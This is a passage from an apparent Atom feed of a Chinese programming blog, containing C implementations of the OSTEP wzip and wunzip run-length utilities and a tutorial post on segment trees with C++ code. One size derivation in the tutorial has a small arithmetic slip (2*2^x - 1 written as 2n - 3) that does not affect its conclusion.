punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wzip"><a href="#wzip" class="headerlink" title="wzip"></a>wzip</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个简单的压缩命令，将连续重复的字符压缩为 <code>cnt + ch</code>。</p><p>算法的逻辑如下：</p><ol><li>先将 ch 初始化为一个文件中不会出现的字符（例如 <code>&#39;\0&#39;</code>），cnt 初始化为 0. </li><li>遍历读取到的每次字符，若与 ch 相同，则将 cnt 加 1；若不同，则使用 <code>fwrite()</code> 写入标准输出，并把 ch 更新为当前字符，cnt 置为 1. 最后，在所有文件遍历完成后，再判断 cnt 是否大于 0，若大于 0，则写入。</li></ol><p>注意，这里的所有字符均要按照规则进行压缩，包括换行符（<code>&#39;\n&#39;</code>），我最开始写的时候还对换行符进行特判，以此来忽略对其进行处理，属实是多此一举了。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">++</span>cnt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ch <span class="token operator">=</span> buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>cnt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wunzip"><a href="#wunzip" class="headerlink" title="wunzip"></a>wunzip</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>相较于编码，解码就简单很多了。使用 <code>fread()</code> 每次读取一个整数 cnt 和一个字符 ch，并使用 for 循环打印 cnt 个 ch 到标准输出即可。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> rc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> cnt<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 Unix Utilities 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>高效的区间二叉搜索树：线段树</title>
    <link href="http://lordaeronesz.github.io/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    <id>http://lordaeronesz.github.io/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/</id>
    <published>2024-03-18T01:03:08.000Z</published>
    <updated>2024-03-18T06:52:41.187Z</updated>
    
    <content type="html"><![CDATA[<p>与树状数组类似，线段树也是一种用来维护区间信息的数据结构，可以在对数时间复杂度内实现更新和查询等操作。但相较于树状数组多用于前缀和查询不同，线段树的应用范围更为广泛，例如区间最值等问题，代价是需要消耗更多的存储空间。</p><span id="more"></span><h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>对于一个长度为 7 的数组，根据该数组 nums 元素建立的线段树结构如下图所示。</p><p>每个结点存储的值为区间 <code>nums[L ~ R]</code> 的元素和，其中根节点对应的 L = 0, R = 6，即整个数组的元素和。然后每一层的结点将区间均分为 <code>[L, (L + R) / 2]</code> 和 <code>[(L + R) / 2 + 1, R]</code> 两部分。注意按此方式进行划分，得到的两个子区间始终满足：左右区间长度分别为 len1 和 len2，且 <code>len1 == len2 || len1 == len2 + 1</code>。不难得知：这样的结构构成一个<strong>完全二叉树</strong>，因此使用顺序存储将会变得很方便：根节点下标为 0；对于每个下标为 idx 的结点，其左孩子下标为 <code>2 * idx + 1</code>，右孩子下标为 <code>2 * idx + 2</code>。</p><p><img src="/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/tree.jpg"></p><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>由于叶子结点的 L 和 R 相等，其值正好为 <code>nums[L]</code>，而每个父结点的值为其两个子结点的值之和，因此可以利用动态规划的思想，先将每个叶子结点的值求出，再依次求出其对应的父结点的值，最终完成线段树的建立。</p><p>有一个值得注意的细节就是关于线段树数组 tree 的长度问题。若线段树正好构成一个<strong>满二叉树</strong>，那么树的深度（令根结点深度为 1）为 logm + 1（m 为 nums 长度，正好为 2 的幂），则当 nums 的长度为 n （n 为任意正整数）时，树的深度为 ⌈logn⌉ + 1. </p><p>若给树最底层的空结点也分配空间，则结点总数 cnt = 2<sup>⌈logn⌉ + 1</sup> - 1.</p><p>令 n = 2<sup>x</sup>，有 cnt = 2 * 2<sup>x</sup> - 1 = 2 * n - 3.</p><p>令 n = 2<sup>x</sup> + 1，有 cnt = 4 * 2<sup>x</sup> - 1 = 4 * n - 5.</p><p>可见始终有 cnt &lt; 4 * n，因此为了方便起见，通常情况下直接令 tree 的长度为 4 * n.</p><h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>查询区间 <code>nums[p ~ q]</code> 的元素和时，若正好可以查询到当前结点 node 对应的区间为 <code>[L, R]</code> 且有 <code>L == p &amp;&amp; R == q</code>，那么此时的 <code>tree[node]</code> 即为所要查找的区间和，直接返回即可；</p><p>否则可将其进行拆分为两个子区间，查找这两个子区间的值，将其求和后返回。如需要查找 <code>nums[2 ~ 4]</code> 的元素和，可将其划分为 <code>nums[2 ~ 3] + nums[4 ~ 4]</code>，分别在根节点的左右两个子树中查找。</p><h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><p>更新与构造做法类似，同样是先修改叶子节点，再依次向上修改。</p><p>不同之处在于更新每次只需要处理一个分支，时间开销 T(n) = T(n / 2) + O(1)，时间复杂度为 O(logn)；而构造时左右子树均需要处理，时间开销 T(n) = 2 * T(n / 2) + O(1)，时间复杂度为 O(n).</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">segmentTree</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">segmentTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> build <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">changeVal</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> change <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rangeSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> range <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">int</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> low <span class="token operator">&amp;&amp;</span> r <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">></span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">range</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;与树状数组类似，线段树也是一种用来维护区间信息的数据结构，可以在对数时间复杂度内实现更新和查询等操作。但相较于树状数组多用于前缀和查询不同，线段树的应用范围更为广泛，例如区间最值等问题，代价是需要消耗更多的存储空间。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>自用耳机盘点</title>
    <link href="http://lordaeronesz.github.io/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/"/>
